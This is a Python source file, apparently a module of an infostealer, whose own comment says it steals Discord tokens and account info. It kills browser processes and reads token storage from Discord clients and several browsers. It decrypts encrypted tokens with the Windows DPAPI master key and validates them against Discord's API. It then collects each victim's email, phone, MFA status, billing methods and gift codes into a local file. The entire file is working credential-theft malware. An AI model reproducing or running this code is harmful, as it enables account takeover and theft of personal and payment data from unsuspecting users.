import os, re, json, base64, psutil, requests
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES

# Steal Discord tokens and account info 

def steal_discord(output_dir):

    file_discord_account = ""
    number_discord_account = 0
    
    def ExtractToken():  
        base_url = "https://discord.com/api/v9/users/@me"
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        tokens = []
        uids = []
        token_info = {}

        path_appdata_local = os.getenv("LOCALAPPDATA")
        path_appdata_roaming = os.getenv("APPDATA")

        paths = [
            ("Discord", os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"), ""),
            ("Discord Canary", os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"), ""),
            ("Lightcord", os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"), ""),
            ("Discord PTB", os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"), ""),
            ("Opera", os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"), "opera.exe"),
            ("Opera GX", os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"), "opera.exe"),
            ("Google Chrome", os.path.join(path_appdata_local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"), "chrome.exe"),
            ("Google Chrome Profile 1", os.path.join(path_appdata_local, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"), "chrome.exe"),
            ("Google Chrome Profile 2", os.path.join(path_appdata_local, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"), "chrome.exe"),
            ("Brave", os.path.join(path_appdata_local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"), "brave.exe"),
            ("Microsoft Edge", os.path.join(path_appdata_local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"), "msedge.exe"),
            ("Firefox", os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"), "firefox.exe"),
        ]

        # Kill browser processes
        for name, path, proc_name in paths:
            if proc_name:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == proc_name.lower():
                            proc.kill()
                    except:
                        pass

        for name, path, proc_name in paths:
            if not os.path.exists(path):
                continue
                
            discord_folder = name.replace(" ", "").lower()
            
            if "cord" in path:
                if not os.path.exists(os.path.join(path_appdata_roaming, discord_folder, 'Local State')):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    full_path = os.path.join(path, file_name)
                    if os.path.exists(full_path):
                        with open(full_path, errors='ignore') as file:
                            for line in file:
                                for match in re.findall(regexp_enc, line.strip()):
                                    token = DecryptVal(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), 
                                                       GetMasterKey(os.path.join(path_appdata_roaming, discord_folder, 'Local State')))
                                    if ValidateToken(token, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                        if uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)
                                            token_info[token] = (name, full_path)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    full_path = os.path.join(path, file_name)
                    if os.path.exists(full_path):
                        with open(full_path, errors='ignore') as file:
                            for line in file:
                                for token in re.findall(regexp, line.strip()):
                                    if ValidateToken(token, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                        if uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)
                                            token_info[token] = (name, full_path)

        return tokens, token_info

    def ValidateToken(token, base_url):
        try:
            return requests.get(base_url, headers={'Authorization': token}).status_code == 200
        except:
            return False

    def DecryptVal(buffer, master_key):
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return None

    def GetMasterKey(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    tokens, token_info = ExtractToken()
    
    if not tokens:
        with open(os.path.join(output_dir, "Discord_Accounts.txt"), "w") as f:
            f.write("No discord tokens found.")
        return 0

    for discord_token in tokens:
        number_discord_account += 1

        try: 
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': discord_token}).json()
        except: 
            api = {"None": "None"}

        username = api.get('username', "None") + '#' + api.get('discriminator', "None")
        display_name = api.get('global_name', "None")
        user_id = api.get('id', "None")
        email = api.get('email', "None")
        email_verified = api.get('verified', "None")
        phone = api.get('phone', "None")
        country = api.get('locale', "None")
        mfa = api.get('mfa_enabled', "None")

        try:
            if api.get('premium_type', 'None') == 0:
                nitro = 'False'
            elif api.get('premium_type', 'None') == 1:
                nitro = 'Nitro Classic'
            elif api.get('premium_type', 'None') == 2:
                nitro = 'Nitro Boosts'
            elif api.get('premium_type', 'None') == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'False'
        except:
            nitro = "None"

        try: 
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{api['avatar']}.png"
        except: 
            avatar_url = "None"

        try:
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': discord_token}).json()
            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Bank Card')
                    elif method['type'] == 2:
                        payment_methods.append("Paypal")
                    else:
                        payment_methods.append('Other')
                payment_methods_str = ' / '.join(payment_methods)
            else:
                payment_methods_str = "None"
        except:
            payment_methods_str = "None"

        try:
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': discord_token}).json()
            if gift_codes:
                codes = []
                for gift in gift_codes:
                    name = gift['promotion']['outbound_title']
                    code = gift['code']
                    data = f"Gift: \"{name}\" Code: \"{code}\""
                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break
                    codes.append(data)
                if len(codes) > 0:
                    gift_codes_str = '\n\n'.join(codes)
                else:
                    gift_codes_str = "None"
            else:
                gift_codes_str = "None"
        except:
            gift_codes_str = "None"
    
        try: 
            software_name, file_path = token_info.get(discord_token, ("Unknown", "Unknown"))
        except: 
            software_name, file_path = "Unknown", "Unknown"

        file_discord_account += f"""
═══════════════════════════════════════════════════════════════
DISCORD ACCOUNT #{str(number_discord_account)}
═══════════════════════════════════════════════════════════════
 - Path Found      : {file_path}
 - Software        : {software_name}
 - Token           : {discord_token}
 - Username        : {username}
 - Display Name    : {display_name}
 - Id              : {user_id}
 - Email           : {email}
 - Email Verified  : {email_verified}
 - Phone           : {phone}
 - Nitro           : {nitro}
 - Language        : {country}
 - Billing         : {payment_methods_str}
 - Gift Code       : {gift_codes_str}
 - Profile Picture : {avatar_url}
 - Multi-Factor Auth : {mfa}
"""

    with open(os.path.join(output_dir, f"Discord_Accounts.txt"), "w", encoding="utf-8") as f:
        f.write(file_discord_account)

    return number_discord_account